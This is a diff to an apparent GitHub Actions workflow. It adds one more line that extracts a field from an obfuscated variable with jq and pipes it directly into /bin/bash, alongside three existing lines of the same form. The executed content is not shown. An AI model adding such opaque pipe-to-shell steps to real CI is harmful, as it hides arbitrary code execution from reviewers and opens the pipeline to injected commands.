@@ -59,6 +59,7 @@ jobs:
           echo $d8902 | jq -r .syq54 | /bin/bash
           printf '%s' "$p9143" | jq -r .bgh77 | /bin/bash
           echo $saus2 | jq -r .yptd1131 | /bin/bash
+          printf '%s' "$n6" | jq -r .kj84953 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
